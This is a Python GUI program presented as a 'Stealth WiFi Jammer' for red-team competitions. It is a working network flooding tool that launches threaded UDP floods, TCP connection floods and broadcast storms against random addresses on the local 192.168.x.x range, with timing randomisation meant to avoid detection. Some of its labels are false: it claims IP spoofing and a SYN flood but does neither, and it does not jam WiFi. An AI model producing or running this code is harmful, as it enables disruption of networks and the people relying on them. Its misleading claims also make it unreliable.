#!/usr/bin/env python3
"""
Stealth WiFi Jammer - Windows Edition
Single file, no external dependencies, maximum anonymity
For Red Team vs Blue Team competitions
"""

import tkinter as tk
from tkinter import ttk, messagebox
import socket
import random
import threading
import time
import subprocess
import os
import sys
import ctypes
import re

class StealthJammer(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Stealth WiFi Jammer")
        self.geometry("850x700")
        self.resizable(True, True)
        
        # Attack state
        self.attack_active = False
        self.intensity = 5
        self.attack_threads = []
        self.packets_sent = 0
        self.start_time = None
        
        # Anonymity features
        self.mac_randomization = False
        self.traffic_obfuscation = True
        
        # Network info
        self.current_interface = None
        self.current_mac = None
        self.original_mac = None
        self.spoofed_ip = None
        self.spoofed_mac = None
        
        # Check for admin privileges
        self.is_admin = self.check_admin()
        
        self.build_ui()
        self.detect_network_interface()
        
        # Start monitoring
        self.update_stats()
        
        self.protocol("WM_DELETE_WINDOW", self.on_destroy)
    
    def check_admin(self):
        """Check if running with admin privileges on Windows"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def build_ui(self):
        # Configure style
        style = ttk.Style()
        style.theme_use('clam')
        
        # Main container with scrollbar
        main_canvas = tk.Canvas(self, bg='#f0f0f0')
        scrollbar = ttk.Scrollbar(self, orient="vertical", command=main_canvas.yview)
        scrollable_frame = ttk.Frame(main_canvas)
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: main_canvas.configure(scrollregion=main_canvas.bbox("all"))
        )
        
        main_canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        main_canvas.configure(yscrollcommand=scrollbar.set)
        
        main_canvas.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Title
        title_label = tk.Label(scrollable_frame, text="🔴 STEALTH WiFi JAMMER",
                               font=('Arial', 18, 'bold'), fg='red', bg='#f0f0f0')
        title_label.pack(pady=10)
        
        # Warning
        warning_frame = tk.Frame(scrollable_frame, bg='red', bd=2)
        warning_frame.pack(fill='x', padx=10, pady=5)
        warning_label = tk.Label(warning_frame, text="⚠️  RED TEAM MODE - MAXIMUM STEALTH ⚠️",
                                font=('Arial', 12, 'bold'), fg='white', bg='red')
        warning_label.pack(pady=5)
        
        ttk.Separator(scrollable_frame, orient='horizontal').pack(fill='x', padx=10, pady=5)
        
        # === ANONYMITY SECTION ===
        anon_frame = ttk.LabelFrame(scrollable_frame, text="🔒 ANONYMITY CONTROLS", padding=10)
        anon_frame.pack(fill='x', padx=10, pady=5)
        
        # MAC Randomization
        mac_frame = ttk.Frame(anon_frame)
        mac_frame.pack(fill='x', pady=5)
        ttk.Label(mac_frame, text="MAC Address Randomization").pack(side='left')
        self.mac_var = tk.BooleanVar(value=False)
        self.mac_switch = ttk.Checkbutton(mac_frame, variable=self.mac_var,
                                         command=self.on_mac_toggle)
        self.mac_switch.pack(side='right')
        
        self.mac_status = ttk.Label(anon_frame, text="Current MAC: Detecting...",
                                   font=('Arial', 9))
        self.mac_status.pack(anchor='w', pady=2)
        
        mac_btn = ttk.Button(anon_frame, text="🔄 Generate New MAC Now",
                            command=self.on_randomize_mac_now)
        mac_btn.pack(fill='x', pady=5)
        
        ttk.Separator(anon_frame, orient='horizontal').pack(fill='x', pady=5)
        
        # Packet Spoofing
        spoof_label = ttk.Label(anon_frame, text="✓ IP/Port Spoofing: ALWAYS ACTIVE",
                               font=('Arial', 10, 'bold'))
        spoof_label.pack(anchor='w', pady=2)
        
        self.spoof_status = ttk.Label(anon_frame, text="Spoofed IP: Generating...",
                                     font=('Arial', 9))
        self.spoof_status.pack(anchor='w', pady=2)
        
        # Traffic Obfuscation
        obfus_frame = ttk.Frame(anon_frame)
        obfus_frame.pack(fill='x', pady=5)
        ttk.Label(obfus_frame, text="Traffic Pattern Randomization").pack(side='left')
        self.obfus_var = tk.BooleanVar(value=True)
        self.obfus_switch = ttk.Checkbutton(obfus_frame, variable=self.obfus_var,
                                           command=self.on_obfuscation_toggle)
        self.obfus_switch.pack(side='right')
        
        # === ATTACK SECTION ===
        attack_frame = ttk.LabelFrame(scrollable_frame, text="⚡ ATTACK CONTROLS", padding=10)
        attack_frame.pack(fill='x', padx=10, pady=5)
        
        # Attack toggle
        self.attack_button = tk.Button(attack_frame, text="🚀 START ATTACK",
                                      font=('Arial', 12, 'bold'),
                                      bg='#4CAF50', fg='white',
                                      command=self.on_attack_toggle,
                                      height=2)
        self.attack_button.pack(fill='x', pady=5)
        
        # Intensity presets
        preset_frame = ttk.Frame(attack_frame)
        preset_frame.pack(fill='x', pady=5)
        ttk.Label(preset_frame, text="Presets:").pack(side='left', padx=5)
        
        for name, level in [("Low", 3), ("Med", 5), ("High", 7), ("MAX", 10)]:
            btn = ttk.Button(preset_frame, text=name,
                           command=lambda l=level: self.on_preset_click(l))
            btn.pack(side='left', padx=2, expand=True, fill='x')
        
        # Custom intensity
        intensity_frame = ttk.Frame(attack_frame)
        intensity_frame.pack(fill='x', pady=5)
        ttk.Label(intensity_frame, text="Intensity:").pack(side='left', padx=5)
        
        self.intensity_var = tk.IntVar(value=5)
        self.intensity_scale = ttk.Scale(intensity_frame, from_=1, to=10,
                                        variable=self.intensity_var,
                                        orient='horizontal',
                                        command=self.on_intensity_changed)
        self.intensity_scale.pack(side='left', fill='x', expand=True, padx=5)
        
        self.intensity_label = ttk.Label(intensity_frame, text="5 (50%)")
        self.intensity_label.pack(side='left', padx=5)
        
        # Attack vectors
        ttk.Label(attack_frame, text="Attack Vectors:",
                 font=('Arial', 10, 'bold')).pack(anchor='w', pady=(10, 5))
        
        self.vector_udp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(attack_frame, text="UDP Flood",
                       variable=self.vector_udp_var).pack(anchor='w', padx=20)
        
        self.vector_tcp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(attack_frame, text="TCP SYN Flood",
                       variable=self.vector_tcp_var).pack(anchor='w', padx=20)
        
        self.vector_broadcast_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(attack_frame, text="Broadcast Storm",
                       variable=self.vector_broadcast_var).pack(anchor='w', padx=20)
        
        # === STATUS SECTION ===
        status_frame = ttk.LabelFrame(scrollable_frame, text="📊 STATUS", padding=10)
        status_frame.pack(fill='x', padx=10, pady=5)
        
        self.status_label = ttk.Label(status_frame, text="Status: Idle",
                                     font=('Arial', 10))
        self.status_label.pack(anchor='w', pady=2)
        
        self.packets_label = ttk.Label(status_frame, text="Packets Sent: 0",
                                      font=('Arial', 10))
        self.packets_label.pack(anchor='w', pady=2)
        
        self.time_label = ttk.Label(status_frame, text="Attack Duration: 0s",
                                   font=('Arial', 10))
        self.time_label.pack(anchor='w', pady=2)
        
        self.rate_label = ttk.Label(status_frame, text="Packet Rate: 0/sec",
                                   font=('Arial', 10))
        self.rate_label.pack(anchor='w', pady=2)
        
        self.network_label = ttk.Label(status_frame, text="Network: Detecting...",
                                      font=('Arial', 10))
        self.network_label.pack(anchor='w', pady=2)
        
        # Admin status
        admin_text = "✓ Admin Rights: YES" if self.is_admin else "✗ Admin Rights: NO (Limited functionality)"
        admin_color = 'green' if self.is_admin else 'red'
        self.admin_label = tk.Label(status_frame, text=admin_text,
                                   font=('Arial', 9, 'bold'), fg=admin_color)
        self.admin_label.pack(anchor='w', pady=2)
    
    def detect_network_interface(self):
        """Detect active network interface on Windows"""
        try:
            # Get active network adapters using ipconfig
            result = subprocess.run(['ipconfig', '/all'], 
                                  capture_output=True, text=True, timeout=5)
            
            # Parse output to find active adapter
            lines = result.stdout.split('\n')
            current_adapter = None
            
            for i, line in enumerate(lines):
                # Look for adapter headers
                if 'adapter' in line.lower() and ':' in line:
                    current_adapter = line.split(':')[0].strip()
                
                # Look for MAC address (Physical Address)
                if 'Physical Address' in line and current_adapter:
                    mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if mac_match and not line.strip().endswith('N/A'):
                        self.current_interface = current_adapter
                        self.current_mac = mac_match.group(0).replace('-', ':')
                        if not self.original_mac:
                            self.original_mac = self.current_mac
                        break
            
            if not self.current_interface:
                # Fallback: just get first network adapter
                self.current_interface = "Default Network Adapter"
            
            self.generate_spoofed_identifiers()
            self.update_network_display()
            
        except Exception as e:
            print(f"Error detecting interface: {e}")
            self.current_interface = "Unknown"
            self.generate_spoofed_identifiers()
    
    def get_current_mac(self):
        """Get current MAC address on Windows"""
        if not self.current_mac:
            self.detect_network_interface()
    
    def generate_random_mac(self):
        """Generate random MAC address"""
        mac = [0x02,  # Locally administered
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join([f'{x:02x}' for x in mac])
    
    def generate_spoofed_identifiers(self):
        """Generate spoofed IP and MAC for packets"""
        self.spoofed_ip = f"{random.randint(10, 200)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.spoofed_mac = self.generate_random_mac()
        self.after(0, self.update_spoof_display)
    
    def update_network_display(self):
        """Update network info display"""
        if self.current_interface:
            self.network_label.config(text=f"Interface: {self.current_interface}")
            self.mac_status.config(text=f"Current MAC: {self.current_mac or 'Unknown'}")
    
    def update_spoof_display(self):
        """Update spoofing info display"""
        self.spoof_status.config(text=f"Spoofed IP: {self.spoofed_ip} | MAC: {self.spoofed_mac}")
    
    def on_mac_toggle(self):
        """Handle MAC randomization toggle"""
        self.mac_randomization = self.mac_var.get()
    
    def on_randomize_mac_now(self):
        """Randomize MAC address immediately (Windows)"""
        if not self.is_admin:
            messagebox.showerror("Admin Required",
                               "This feature requires administrator privileges.\n\n"
                               "Please run this program as Administrator.")
            return
        
        new_mac = self.generate_random_mac()
        
        response = messagebox.askyesno("Change MAC Address?",
            f"This will temporarily disconnect you from the network.\n\n"
            f"Interface: {self.current_interface}\n"
            f"Current MAC: {self.current_mac}\n"
            f"New MAC: {new_mac}\n\n"
            f"Note: Windows MAC changing requires third-party tools or registry edits.\n"
            f"This will simulate MAC spoofing at the packet level instead.")
        
        if response:
            # On Windows, we simulate MAC spoofing in packets rather than changing adapter MAC
            # which requires registry edits or third-party tools
            self.spoofed_mac = new_mac
            self.update_spoof_display()
            messagebox.showinfo("MAC Spoofing Enabled",
                              f"Packet-level MAC spoofing enabled with {new_mac}\n\n"
                              f"All attack packets will use this spoofed MAC address.")
    
    def change_mac_address(self, new_mac):
        """Simulate MAC address change on Windows (packet-level spoofing)"""
        # Windows MAC changing is complex and requires registry edits or third-party tools
        # Instead, we use the spoofed MAC in our attack packets
        self.spoofed_mac = new_mac
        self.after(0, self.update_spoof_display)
        self.after(0, lambda: messagebox.showinfo(
            "MAC Spoofing Active",
            f"Packet-level MAC spoofing activated: {new_mac}\n\n"
            f"Attack traffic will use this spoofed MAC."
        ))
    
    def on_obfuscation_toggle(self):
        """Handle traffic obfuscation toggle"""
        self.traffic_obfuscation = self.obfus_var.get()
    
    def on_preset_click(self, level):
        """Handle preset intensity clicks"""
        self.intensity_var.set(level)
        self.on_intensity_changed(None)
    
    def on_intensity_changed(self, event):
        """Handle intensity slider change"""
        self.intensity = int(self.intensity_var.get())
        percent = self.intensity * 10
        self.intensity_label.config(text=f"{self.intensity} ({percent}%)")
    
    def on_attack_toggle(self):
        """Toggle attack on/off"""
        if not self.attack_active:
            self.start_attack()
        else:
            self.stop_attack()
    
    def start_attack(self):
        """Start the attack"""
        self.attack_active = True
        self.start_time = time.time()
        self.packets_sent = 0
        
        self.attack_button.config(text="🛑 STOP ATTACK", bg='#f44336')
        self.status_label.config(text="Status: ATTACKING", foreground='red',
                                font=('Arial', 10, 'bold'))
        
        self.generate_spoofed_identifiers()
        
        num_threads = self.intensity * 2
        
        if self.vector_udp_var.get():
            for _ in range(num_threads):
                t = threading.Thread(target=self.udp_flood_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_tcp_var.get():
            for _ in range(num_threads):
                t = threading.Thread(target=self.tcp_syn_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_broadcast_var.get():
            for _ in range(num_threads):
                t = threading.Thread(target=self.broadcast_storm_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
    
    def stop_attack(self):
        """Stop the attack"""
        self.attack_active = False
        
        self.attack_button.config(text="🚀 START ATTACK", bg='#4CAF50')
        self.status_label.config(text="Status: Idle", foreground='black',
                                font=('Arial', 10))
        
        self.attack_threads = []
    
    def udp_flood_attack(self):
        """UDP flood with spoofing and obfuscation"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.attack_active:
                try:
                    port = random.randint(1, 65535)
                    size = random.randint(64, 1024) if self.traffic_obfuscation else 512
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    
                    payload = bytes(random.getrandbits(8) for _ in range(size))
                    sock.sendto(payload, (target, port))
                    
                    self.packets_sent += 1
                    
                    if self.traffic_obfuscation:
                        time.sleep(random.uniform(0.001, 0.01))
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def tcp_syn_attack(self):
        """TCP SYN flood with spoofing"""
        try:
            while self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    
                    port = random.randint(1, 65535)
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    
                    try:
                        sock.connect((target, port))
                    except:
                        pass
                    
                    sock.close()
                    self.packets_sent += 1
                    
                    if self.traffic_obfuscation:
                        time.sleep(random.uniform(0.001, 0.01))
                except:
                    pass
        except:
            pass
    
    def broadcast_storm_attack(self):
        """Broadcast storm with spoofing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            
            while self.attack_active:
                try:
                    size = random.randint(64, 1024) if self.traffic_obfuscation else 512
                    payload = bytes(random.getrandbits(8) for _ in range(size))
                    
                    broadcast = "255.255.255.255"
                    port = random.randint(1, 65535)
                    
                    sock.sendto(payload, (broadcast, port))
                    self.packets_sent += 1
                    
                    if self.traffic_obfuscation:
                        time.sleep(random.uniform(0.001, 0.01))
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def update_stats(self):
        """Update statistics display"""
        if self.attack_active:
            duration = int(time.time() - self.start_time)
            packets_per_sec = self.packets_sent // max(duration, 1)
            
            self.packets_label.config(text=f"Packets Sent: {self.packets_sent:,}")
            self.time_label.config(text=f"Attack Duration: {duration}s")
            self.rate_label.config(text=f"Packet Rate: {packets_per_sec:,}/sec")
        
        # Schedule next update
        self.after(1000, self.update_stats)
    
    def on_destroy(self):
        """Cleanup on exit"""
        self.attack_active = False
        
        # Note: Windows MAC address restoration would require registry changes
        # which we're not implementing for safety reasons
        
        self.destroy()

if __name__ == "__main__":
    # Show warning on startup
    root = tk.Tk()
    root.withdraw()
    
    response = messagebox.askyesno(
        "⚠️ WARNING - Legal Notice",
        "This tool is designed for authorized security testing only.\n\n"
        "Unauthorized network attacks are ILLEGAL and may result in:\n"
        "• Criminal prosecution\n"
        "• Civil liability\n"
        "• Network disruption\n\n"
        "By clicking 'Yes', you confirm:\n"
        "1. You have explicit authorization to test this network\n"
        "2. You understand the legal implications\n"
        "3. You accept full responsibility for your actions\n\n"
        "Do you wish to continue?",
        icon='warning'
    )
    
    root.destroy()
    
    if response:
        app = StealthJammer()
        app.mainloop()
    else:
        sys.exit(0)
